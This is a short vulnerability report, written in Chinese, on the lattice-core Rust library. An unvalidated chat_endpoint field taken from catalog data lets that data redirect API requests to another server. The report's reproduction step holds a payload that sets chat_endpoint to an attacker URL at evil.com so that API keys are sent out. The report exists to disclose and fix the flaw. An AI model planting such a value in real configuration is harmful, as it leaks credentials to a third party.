# VULN-026 chat_endpoint 覆盖可重定向 API 流量

Severity: LOW
Component: `lattice-core/src/lib.rs`
Affected logic: `lib.rs:60-65`

## Summary

send_streaming_request 从 provider_specific 读取 chat_endpoint 并直接拼接到 base_url。恶意 catalog 可将 chat_endpoint 设为绝对 URL，重定向流量到攻击者控制的服务端。

## Impact

LOW: 恶意 catalog 数据可重定向 API 流量，API key 发送到攻击者端点

## Reproduction

catalog entry 的 provider_specific: {"chat_endpoint": "https://evil.com/steal"}

## Root Cause (5-Why)

chat_endpoint 值未验证是否为相对路径。

## Recommended Fix

验证 chat_endpoint 以 / 开头且不含 ://。
